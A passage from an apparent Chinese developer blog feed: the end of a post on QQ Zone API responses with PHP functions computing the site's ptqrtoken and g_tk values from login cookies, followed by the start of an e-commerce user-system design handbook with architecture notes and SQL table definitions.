class="number">0</span>,</span><br><span class="line">                                <span class="attr">"isFamousWhite"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"isQzoneUser"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"isAnnualVip"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"isSetNickGlint"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"medalInfo"</span>: &#123;</span><br><span class="line">                                    <span class="attr">"medal_type"</span>: <span class="number">0</span>,</span><br><span class="line">                                    <span class="attr">"medal_state"</span>: <span class="number">0</span>,</span><br><span class="line">                                    <span class="attr">"level"</span>: <span class="number">0</span>,</span><br><span class="line">                                    <span class="attr">"pic_url"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"jump_url"</span>: <span class="string">""</span></span><br><span class="line">                                &#125;,</span><br><span class="line">                                <span class="attr">"descicon"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"icon_width"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"icon_height"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"isSweetVip"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"stuStarInfo"</span>: &#123;</span><br><span class="line">                                    <span class="attr">"iStarStatus"</span>: <span class="number">0</span>,</span><br><span class="line">                                    <span class="attr">"iStarLevel"</span>: <span class="number">0</span>,</span><br><span class="line">                                    <span class="attr">"isAnnualVip"</span>: <span class="number">0</span>,</span><br><span class="line">                                    <span class="attr">"isHighStarVip"</span>: <span class="number">0</span></span><br><span class="line">                                &#125;,</span><br><span class="line">                                <span class="attr">"stuCombineDiamondInfo"</span>: &#123;</span><br><span class="line">                                    <span class="attr">"iShowType"</span>: <span class="number">0</span>,</span><br><span class="line">                                    <span class="attr">"iVipLevel"</span>: <span class="number">0</span>,</span><br><span class="line">                                    <span class="attr">"isAnnualVip"</span>: <span class="number">0</span>,</span><br><span class="line">                                    <span class="attr">"isAnnualVipEver"</span>: <span class="number">0</span></span><br><span class="line">                                &#125;,</span><br><span class="line">                                <span class="attr">"isSafeModeUser"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"vipShowType"</span>: <span class="number">-1</span>,</span><br><span class="line">                                <span class="attr">"namePlate"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"actiontype"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"actionurl"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"decoration"</span>: &#123;</span><br><span class="line">                                    <span class="attr">"type"</span>: <span class="string">"Buffer"</span>,</span><br><span class="line">                                    <span class="attr">"data"</span>: []</span><br><span class="line">                                &#125;,</span><br><span class="line">                                <span class="attr">"tagInfos"</span>: [],</span><br><span class="line">                                <span class="attr">"strPortraitId"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"under_nickname_desc"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"liveshowMedalInfo"</span>: &#123;</span><br><span class="line">                                    <span class="attr">"medal_type"</span>: <span class="number">0</span>,</span><br><span class="line">                                    <span class="attr">"medal_state"</span>: <span class="number">0</span>,</span><br><span class="line">                                    <span class="attr">"level"</span>: <span class="number">0</span>,</span><br><span class="line">                                    <span class="attr">"pic_url"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"jump_url"</span>: <span class="string">""</span></span><br><span class="line">                                &#125;,</span><br><span class="line">                                <span class="attr">"uFansCount"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"uVisitorCount"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"isCmtVerifyOpen"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"iCurUserType"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"displayflag"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"vtime"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"authqzoneMedalInfo"</span>: &#123;</span><br><span class="line">                                    <span class="attr">"medal_type"</span>: <span class="number">0</span>,</span><br><span class="line">                                    <span class="attr">"medal_state"</span>: <span class="number">0</span>,</span><br><span class="line">                                    <span class="attr">"level"</span>: <span class="number">0</span>,</span><br><span class="line">                                    <span class="attr">"pic_url"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"jump_url"</span>: <span class="string">""</span></span><br><span class="line">                                &#125;,</span><br><span class="line">                                <span class="attr">"eUserTypeReport"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"iVipActType"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"openid_users"</span>: &#123;</span><br><span class="line">                                    <span class="attr">"openid"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"nickname"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"logo"</span>: <span class="string">""</span></span><br><span class="line">                                &#125;,</span><br><span class="line">                                <span class="attr">"sex"</span>: <span class="number">0</span></span><br><span class="line">                            &#125;,</span><br><span class="line">                            <span class="attr">"refer"</span>: <span class="string">""</span>,</span><br><span class="line">                            <span class="attr">"superflag"</span>: <span class="number">0</span>,</span><br><span class="line">                            <span class="attr">"customPraise"</span>: &#123;</span><br><span class="line">                                <span class="attr">"iItemId"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"strPraisePic"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"metaDataCustom"</span>: &#123;</span><br><span class="line">                                    <span class="attr">"iItemId"</span>: <span class="number">0</span>,</span><br><span class="line">                                    <span class="attr">"strPraisePic"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"strPraiseZip"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"strPraiseComboZip"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"iFrameRate"</span>: <span class="number">0</span>,</span><br><span class="line">                                    <span class="attr">"strPraiseButton"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"customPraisetype"</span>: <span class="number">0</span>,</span><br><span class="line">                                    <span class="attr">"uiComboCount"</span>: <span class="number">0</span>,</span><br><span class="line">                                    <span class="attr">"subpraisetype"</span>: <span class="number">0</span></span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;,</span><br><span class="line">                            <span class="attr">"cpolyPraise"</span>: &#123;</span><br><span class="line">                                <span class="attr">"iItemId"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"strPicUrl"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"strText"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"itype"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"resourceId"</span>: <span class="number">0</span></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        ...</span><br><span class="line">                    ]</span><br><span class="line">                &#125;,</span><br><span class="line">                "operation": &#123;</span><br><span class="line">                    "busi_param": &#123;</span><br><span class="line">                        "4": "",</span><br><span class="line">                        "5": "http://user.qzone.qq.com/评论好友QQ/mood/8fa9d120c66ab55e0ac40000",</span><br><span class="line">                        "6": "http://user.qzone.qq.com/评论好友QQ/mood/8fa9d120c66ab55e0ac40000",</span><br><span class="line">                        "16": "0",</span><br><span class="line">                        "23": "0",</span><br><span class="line">                        "30": "1",</span><br><span class="line">                        "48": "0",</span><br><span class="line">                        "52": "",</span><br><span class="line">                        "97": "&amp;feedtype1=1&amp;feedtype2=14&amp;feedtype3=1&amp;org_uniq_key=&amp;sUniqId=评论好友QQ_311_8fa9d120c66ab55e0ac40000&amp;fExposUniqId=&amp;colorexptid=0&amp;colorstrategyid=0",</span><br><span class="line">                        "101": "0=&amp;1=&amp;2=&amp;3=&amp;4=评论好友QQ&amp;5=&amp;6=0&amp;7=&amp;8=&amp;9=&amp;10=0&amp;76=",</span><br><span class="line">                        "104": "",</span><br><span class="line">                        "121": "&amp;feedtype1=1&amp;feedtype2=14&amp;feedtype3=1&amp;org_uniq_key=&amp;sUniqId=评论好友QQ_311_8fa9d120c66ab55e0ac40000&amp;fExposUniqId=&amp;colorexptid=0&amp;colorstrategyid=0",</span><br><span class="line">                        "141": "",</span><br><span class="line">                        "142": "1",</span><br><span class="line">                        "184": "看看不同的风景，接触不同的人和事，你会发现，自己的烦恼原来是那么微不足道，自己的经历原来那么浅薄。学会给自己现实，不沉溺幻想，不庸人自扰，好好生活，做一个接近幸福的人。 ​​​​  ​",</span><br><span class="line">                        "-100": "appid:311 typeid:0 feedtype:0 hostuin:QQ号码 feedskey:8fa9d120c66ab55e0ac40000 "</span><br><span class="line">                    &#125;,</span><br><span class="line">                    "weixin_url": "",</span><br><span class="line">                    "qq_url": "",</span><br><span class="line">                    "share_info": &#123;</span><br><span class="line">                        "title": "",</span><br><span class="line">                        "summary": "",</span><br><span class="line">                        "photourl": &#123;&#125;,</span><br><span class="line">                        "ark_sharedata": &#123;</span><br><span class="line">                            "ark_id": "",</span><br><span class="line">                            "view_id": "",</span><br><span class="line">                            "ark_content": ""</span><br><span class="line">                        &#125;,</span><br><span class="line">                        "action_url": ""</span><br><span class="line">                    &#125;,</span><br><span class="line">                    "schema_info": &#123;</span><br><span class="line">                        "actiontype": 0,</span><br><span class="line">                        "actionurl": "",</span><br><span class="line">                        "downloadurl": "",</span><br><span class="line">                        "appid": "",</span><br><span class="line">                        "postparams": "",</span><br><span class="line">                        "usepost": 0,</span><br><span class="line">                        "schemapageurl": "",</span><br><span class="line">                        "appname": "",</span><br><span class="line">                        "loadingpage": false,</span><br><span class="line">                        "yingyongbao": true,</span><br><span class="line">                        "master_actionurl": ""</span><br><span class="line">                    &#125;,</span><br><span class="line">                    "recomm_cookie": &#123;</span><br><span class="line">                        "0": "",</span><br><span class="line">                        "1": "",</span><br><span class="line">                        "2": "",</span><br><span class="line">                        "3": "",</span><br><span class="line">                        "4": "评论好友QQ",</span><br><span class="line">                        "5": "",</span><br><span class="line">                        "6": "0",</span><br><span class="line">                        "7": "",</span><br><span class="line">                        "8": "",</span><br><span class="line">                        "9": "",</span><br><span class="line">                        "10": "0",</span><br><span class="line">                        "19": "feedtype=17694976&amp;feed_uin=评论好友QQ",</span><br><span class="line">                        "76": ""</span><br><span class="line">                    &#125;,</span><br><span class="line">                    "click_stream_report": &#123;&#125;,</span><br><span class="line">                    "qboss_trace": "",</span><br><span class="line">                    "custom_btn": [],</span><br><span class="line">                    "feed_report_cookie": &#123;</span><br><span class="line">                        "1": "17694976",</span><br><span class="line">                        "2": "0",</span><br><span class="line">                        "3": "评论好友QQ_311_8fa9d120c66ab55e0ac40000",</span><br><span class="line">                        "4": "",</span><br><span class="line">                        "5": "",</span><br><span class="line">                        "6": "",</span><br><span class="line">                        "7": "",</span><br><span class="line">                        "8": "1588947653",</span><br><span class="line">                        "9": ",3,10",</span><br><span class="line">                        "11": "",</span><br><span class="line">                        "13": "",</span><br><span class="line">                        "15": "0",</span><br><span class="line">                        "16": "",</span><br><span class="line">                        "20": "1589276615",</span><br><span class="line">                        "21": "",</span><br><span class="line">                        "22": "",</span><br><span class="line">                        "29": "",</span><br><span class="line">                        "30": "",</span><br><span class="line">                        "31": "",</span><br><span class="line">                        "42": "",</span><br><span class="line">                        "47": "1",</span><br><span class="line">                        "48": ""</span><br><span class="line">                    &#125;,</span><br><span class="line">                    "generic_url": "",</span><br><span class="line">                    "bypass_param": &#123;&#125;,</span><br><span class="line">                    "droplist_cookie": &#123;</span><br><span class="line">                        "19": "feedtype=17694976&amp;feed_uin=评论好友QQ"</span><br><span class="line">                    &#125;,</span><br><span class="line">                    "rank_param": &#123;&#125;,</span><br><span class="line">                    "button_gif_url": "",</span><br><span class="line">                    "offline_resource_bid": 0</span><br><span class="line">                &#125;,</span><br><span class="line">                "visitor": &#123;</span><br><span class="line">                    "view_count": 150,</span><br><span class="line">                    "visitor_count": 0,</span><br><span class="line">                    "visitors": [],</span><br><span class="line">                    "mod": 0,</span><br><span class="line">                    "view_count_byfriends": 0,</span><br><span class="line">                    "myfriend_info": ""</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><h4 id="计算ptqrtoken"><a href="#计算ptqrtoken" class="headerlink" title="计算ptqrtoken"></a>计算ptqrtoken</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 计算ptqrtoken</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $qrSig 获取二维码的cookie中qrsig的值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getPtQrToken</span><span class="params">($qrSig = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $hash = <span class="number">0</span>;</span><br><span class="line">        $qrSig = preg_split(<span class="string">'/(?&lt;!^)(?!$)/u'</span>, $qrSig);</span><br><span class="line">        <span class="keyword">foreach</span> ($qrSig <span class="keyword">as</span> $char) &#123;</span><br><span class="line">            $hash += ((($hash &lt;&lt; <span class="number">5</span>) &amp; <span class="number">0x7fffffff</span>) + ord($char)) &amp; <span class="number">0x7fffffff</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x7fffffff</span> &amp; $hash;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="计算g-tk"><a href="#计算g-tk" class="headerlink" title="计算g_tk"></a>计算g_tk</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 计算g_tk</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> string $p_skey 登录的Cookie中p_skey</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> int</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">getGTK</span><span class="params">($p_skey)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       $hash = <span class="number">5381</span>;</span><br><span class="line">       $p_skey = preg_split(<span class="string">'/(?&lt;!^)(?!$)/u'</span>, $p_skey);</span><br><span class="line">       <span class="keyword">foreach</span> ($p_skey <span class="keyword">as</span> $char) &#123;</span><br><span class="line">           $hash += ((($hash &lt;&lt; <span class="number">5</span>) &amp; <span class="number">0x7fffffff</span>) + ord($char)) &amp; <span class="number">0x7fffffff</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> $hash &amp; <span class="number">0x7fffffff</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>电商设计手册</title>
    <url>/articles/%E7%94%B5%E5%95%86%E8%AE%BE%E8%AE%A1%E6%89%8B%E5%86%8C/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一直从事互联网电商开发三年多的时间了，回头想想却对整个业务流程不是很了解，说出去很是惭愧。但是身处互联网电商的环境中，或多或少接触了其中的各个业务，其次周边还有很多从事电商的同事和朋友，这都是资源。于是，我决定和我的同事、盆友们、甚至还有你们去梳理整个流程并分享出来，谈不上结果要做的多么好，至少在每一个我们有能力去做好的地方，一定会细致入微。</p>
<p>除此之外，同时为了满足我们自身在工作中可能得不到的技术满足感，我们在做整个系统设计的过程中，会去使用我们最想用的技术栈。技术栈这一点我们借助docker去实现，所以最终的结果：一方面我们掌握了业务的东西，另一方面又得到了技术上的满足感，二者兼得。</p>
<p>最后，出于时间的考虑，我们提出了一个想法<strong>Do design No code</strong>。<strong>【只设计不码码】</strong> 这句话的意思：最终我们设计出来整个系统的数据模型，接口文档，甚至交互过程，以及环境部署等，但是最后我们却不写代码。是吧？如果这样了写代码还有什么意义。当然，也不全是这样，出于时间的考虑当然也会用代码实现出来的，说不定最后正是对面的你去实现的。</p>
<p>其次，这些内容肯定有考虑不全面或者在上规模的业务中存在更复杂的地方，欢迎指出，我们也希望学习和分享您的经验。</p>
<h1 id="技术栈选型"><a href="#技术栈选型" class="headerlink" title="技术栈选型"></a>技术栈选型</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 基础环境</span><br><span class="line">    + k8s</span><br><span class="line">    + docker</span><br><span class="line">- 存储</span><br><span class="line">    + mysql</span><br><span class="line">    + redis</span><br><span class="line">        * codis</span><br><span class="line">        * redis主从</span><br><span class="line">- queue</span><br><span class="line">    + kafka</span><br><span class="line">    + rocketmq</span><br><span class="line">    + rabbitmq</span><br><span class="line">- gw</span><br><span class="line">    + kong</span><br><span class="line">    + zuul</span><br><span class="line">- webserver</span><br><span class="line">    + nginx/openresty</span><br><span class="line">    + envoy</span><br><span class="line">- server</span><br><span class="line">    + go</span><br><span class="line">    + php</span><br><span class="line">- frontend</span><br><span class="line">    + vue</span><br><span class="line">- rpc</span><br><span class="line">    + grpc</span><br><span class="line">    + thrift</span><br><span class="line">- 基础能力</span><br><span class="line">    + 监控</span><br><span class="line">        * zipkin</span><br><span class="line">        * elk</span><br><span class="line">        * falcon</span><br><span class="line">    + 服务发现</span><br><span class="line">        * zookeeper</span><br><span class="line">        * etcd</span><br><span class="line">    + 持续集成</span><br><span class="line">        * ci/cd</span><br><span class="line">- 搜索</span><br><span class="line">    + es</span><br><span class="line">    + solr</span><br></pre></td></tr></table></figure>

<h1 id="代码仓库"><a href="#代码仓库" class="headerlink" title="代码仓库"></a>代码仓库</h1><p>请您耐心等待…</p>
<h1 id="用户体系"><a href="#用户体系" class="headerlink" title="用户体系"></a>用户体系</h1><p>今天，我们开始第一部分<strong>用户体系</strong>的设计。本文分为如下四大模块：</p>
<ul>
<li>架构设计</li>
<li>数据模型设计</li>
<li>交互设计</li>
<li>接口设计</li>
</ul>
<h2 id="架构设计"><a href="#架构设计" class="headerlink" title="架构设计"></a>架构设计</h2><h3 id="简单来看用户体系"><a href="#简单来看用户体系" class="headerlink" title="简单来看用户体系"></a>简单来看用户体系</h3><p>当你第一次接触和用户相关的互联网产品时，或者曾今在我眼里。<strong>用户体系</strong>无非就是“登录”和“注册”，“修改用户信息”这些，等。简单来做的话，无非我们需要一张表去记录用户的身份信息：注册时(insert操作)，往表里插入一个数据；登录时(select&amp;update操作)，通过用户标识(手机号、邮箱等)判断用户的密码是否正确；修改用户信息(select&amp;update操作)，就是直接update这个uid的用户信息(头像、昵称等)。</p>
<p><img src="/articles/电商设计手册/skr-account-smaple-structure.png" alt></p>
<p>这样设计的确没什么问题，很简单不是么。但是随着业务的发展，一方面我们需要提供统一的用户管理(高内聚)，又要提高系统的可扩展性，所以我想呈现出来的是我理解的<strong>一个基本用户体系应该有的东西</strong>。</p>
<h3 id="一个基本用户体系应该有的东西"><a href="#一个基本用户体系应该有的东西" class="headerlink" title="一个基本用户体系应该有的东西"></a>一个基本用户体系应该有的东西</h3><p>首先我们对原有的用户表进行再一次的抽象(抽离用户注册、登录依赖的字段、第三方登录) -&gt; <strong>账户表</strong>，为什么这么做？随着业务的发展，以前只维护一个产品，也许某一天又开发新的产品，这样我们就可以统一的维护我们公司所有产品的注册登录逻辑，不同的产品只维护该产品和用户相关的信息即可(具体依赖产品形态)。如下图所示：</p>
<p><img src="/articles/电商设计手册/skr-user-system-2.png" alt></p>
<p>上图中，还提到了第三方登录/员工表/后台权限管理，这些都是一些用户体系基本必备的结构。</p>
<p>第三方登录：第三方也是登录方式的一种，我们也把它抽象到账户的一部分，如上图所示。其次，关于第三方登录这里存在一个交互方式设计存在的问题，后面交互设计时会提到。</p>
<p>员工：因为上面我们抽离了账户表，所以内部的管理系统后台也可以统一的使用账户表的登录逻辑，这样全公司在账号这个事情上达到了真正的高内聚。</p>
<p>提到了员工，我们的内部各种系统后台肯定涉及各种的权限管理，所以这里提到了简单的RBAC(基于角色的权限控制)，具体的逻辑数据模型设计会提到。</p>
<h3 id="最终的架构"><a href="#最终的架构" class="headerlink" title="最终的架构"></a>最终的架构</h3><p>随着业务产品形态的越来越复杂，在设计架构的时候，我们需要分析其中的<strong>变与不变</strong>：</p>
<ul>
<li>变：越来越多的产品个性化用户需求</li>
<li>不变：注册登录的逻辑</li>
</ul>
<p>最终的结果，我们把原有的用户拆成了<strong>账户</strong>和<strong>用户</strong>，同时我们也要在这里明确这两个概念的区别：</p>
<ul>
<li>账户：整个体系唯一生产uid的地方，内聚注册登录逻辑，不涉及产品业务需求</li>
<li>用户：不同产品个性化的用户需求信息</li>
</ul>
<p>最终的架构图如下：</p>
<ul>
<li>第一部分：账户(<strong>服务层</strong>)</li>
<li>第二部分：用户(<strong>应用层</strong>，无限水平扩展)</li>
<li>第三部分：员工(<strong>应用层</strong>，员工权限体系)</li>
</ul>
<p><img src="/articles/电商设计手册/skr-account-structure.jpg" alt></p>
<h2 id="数据模型设计"><a href="#数据模型设计" class="headerlink" title="数据模型设计"></a>数据模型设计</h2><p>对应上面的架构，我们很容易设计出我们的数据模型(这里假设我们目前只有一个对C端的应用)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">账户 -&gt; 1.账户表</span><br><span class="line">用户 -&gt; 2.用户表</span><br><span class="line">员工 -&gt; 3.员工表</span><br></pre></td></tr></table></figure>

<p>除了上面三张表外，还需要我们的R(role)B(base)A(access)C(control)权限管理,RBAC基于角色的权限管理大家应该很熟悉，这里我就不详细说了，简单的RBAC首先需要：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4.系统菜单表(菜单即权限)，系统的uri路径</span><br><span class="line">5.权限表(菜单即权限)，具体的权限就是访问系统的菜单</span><br><span class="line">6.角色表，一个角色具有哪些权限</span><br><span class="line">7.员工和角色的关联表，一个员工属于哪个角色</span><br></pre></td></tr></table></figure>

<p>好了一个简单的RBAC涉及的表基本罗列出来了，但是在我的工作经历中大家实现的权限管理往往只针对某个系统，这样对于众多的系统后台来说就是乱、重复造轮子、权限管理效率低。所以我在上面的架构设计中把权限作为了一个服务为全系统提供基础服务能力。而达到这个目的的结果我只需要再增加一张表：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">8.后台管理系统表, 登记所有的后台管理系统(这样通过系统id和系统资源uri的id就可以全局构成唯一性，单纯的uri存在重复的可能性，用uri不用url的原因是域名存在变动的可能性)</span><br></pre></td></tr></table></figure>

<p>最后我们的用户体系应该基本就上面8张表。咦，貌似漏掉了第三方登录，我们加上吧，很简单如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">9. 第三方用户登录表，记录不同第三方的用户标示</span><br></pre></td></tr></table></figure>

<p>最最后就是上面的9张表了，具体的表结构和sql如下：</p>
<p><img src="/articles/电商设计手册/skr-account-model-2.png" alt></p>
<p><strong>账户模型</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">-- 账户模型</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`account_user`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'账号id'</span>,</span><br><span class="line">  <span class="string">`email`</span> <span class="built_in">varchar</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'邮箱'</span>,</span><br><span class="line">  <span class="string">`phone`</span> <span class="built_in">varchar</span>(<span class="number">15</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'手机号'</span>,</span><br><span class="line">  <span class="string">`username`</span> <span class="built_in">varchar</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'用户名'</span>,</span><br><span class="line">  <span class="string">`password`</span> <span class="built_in">varchar</span>(<span class="number">32</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'密码'</span>,</span><br><span class="line">  <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">  <span class="string">`create_ip_at`</span> <span class="built_in">varchar</span>(<span class="number">12</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'创建ip'</span>,</span><br><span class="line">  <span class="string">`last_login_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'最后一次登录时间'</span>,</span><br><span class="line">  <span class="string">`last_login_ip_at`</span> <span class="built_in">varchar</span>(<span class="number">12</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'最后一次登录ip'</span>,</span><br><span class="line">  <span class="string">`login_times`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'登录次数'</span>,</span><br><span class="line">  <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 1:enable, 0:disable, -1:deleted'</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>),</span><br><span class="line">  <span class="keyword">KEY</span> <span class="string">`idx_email`</span> (<span class="string">`email`</span>),</span><br><span class="line">  <span class="keyword">KEY</span> <span class="string">`idx_phone`</span> (<span class="string">`phone`</span>),</span><br><span class="line">  <span class="keyword">KEY</span> <span class="string">`idx_username`</span> (<span class="string">`username`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'账户'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 第三方账户</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`account_platform`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'自增id'</span>,</span><br><span class="line">  <span class="string">`uid`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'账号id'</span>,</span><br><span class="line">  <span class="string">`platform_id`</span> <span class="built_in">varchar</span>(<span class="number">60</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'平台id'</span>,</span><br><span class="line">  <span class="string">`platform_token`</span> <span class="built_in">varchar</span>(<span class="number">60</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'平台access_token'</span>,</span><br><span class="line">  <span class="string">`type`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'平台类型 0:未知,1:facebook,2:google,3:wechat,4:qq,5:weibo,6:twitter'</span>,</span><br><span class="line">  <span class="string">`nickname`</span> <span class="built_in">varchar</span>(<span class="number">60</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'昵称'</span>,</span><br><span class="line">  <span class="string">`avatar`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'头像'</span>,</span><br><span class="line">  <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">  <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span 